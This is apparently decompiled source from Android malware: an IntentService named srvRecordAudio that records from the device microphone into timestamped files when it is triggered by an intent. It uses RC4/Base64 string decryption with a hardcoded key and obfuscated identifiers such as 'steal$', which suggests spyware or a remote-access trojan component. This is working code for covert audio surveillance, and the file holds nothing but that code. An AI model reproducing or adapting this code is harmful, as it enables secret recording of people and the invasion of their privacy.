package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import java.text.*;
import java.util.*;
import android.media.*;
import com.example.mmm.service.*;
import android.content.*;

public class srvRecordAudio extends IntentService
{
    boolean version$;
    utils brunei$;
    constants exterior$;
    String steal$;
    
    public srvRecordAudio() {
        super("");
        this.version$ = false;
        this.brunei$ = new utils();
        this.exterior$ = new constants();
    }
    
    public final String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        final int \u0131nt = Integer.parseInt(\u0131ntent.getStringExtra("tick"));
        final String stringExtra = \u0131ntent.getStringExtra("name");
        if (\u0131nt > 0 || \u0131nt == -1) {
            final String format = new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US).format(Calendar.getInstance().getTime());
            final StringBuilder sb = new StringBuilder();
            sb.append("/");
            sb.append(stringExtra);
            sb.append("_");
            sb.append(format);
            sb.append(".amr");
            final String string = sb.toString();
            final StringBuilder sb2 = new StringBuilder();
            sb2.append(this.getExternalFilesDir((String)null));
            sb2.append(string);
            this.steal$ = sb2.toString();
            final utils brunei$ = this.brunei$;
            final String s = "FILE REC";
            final StringBuilder sb3 = new StringBuilder();
            sb3.append(this.steal$);
            brunei$.Log(s, sb3.toString());
            this.brunei$.Log("Time", String.valueOf(\u0131nt));
            final String steal$ = this.steal$;
            final MediaRecorder mediaRecorder = new MediaRecorder();
            this.brunei$.Log("SOUND", "START RECORD SOUND");
            this.version$ = false;
            mediaRecorder.setAudioSource(1);
            mediaRecorder.setOutputFormat(3);
            mediaRecorder.setAudioEncoder(1);
            mediaRecorder.setOutputFile(steal$);
            final Thread thread = new Thread(new srvRecordAudio$Runnable(this, \u0131nt, mediaRecorder, steal$, (Context)this));
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
            this.brunei$.SettingsWrite((Context)this, "SS", "start");
        }
    }
}
